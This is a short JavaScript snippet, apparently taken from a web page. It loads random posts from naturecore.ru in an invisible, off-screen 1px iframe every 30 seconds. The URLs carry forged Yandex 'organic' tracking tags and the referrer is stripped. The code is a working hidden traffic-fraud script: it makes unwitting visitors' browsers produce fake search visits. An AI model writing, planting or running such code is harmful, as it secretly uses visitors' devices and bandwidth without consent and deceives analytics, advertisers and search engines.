  const urls = [
    "https://www.naturecore.ru/2025/02/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_58.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_34.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_85.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_88.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_13.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_39.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_40.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.naturecore.ru/2025/02/blog-post_28.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
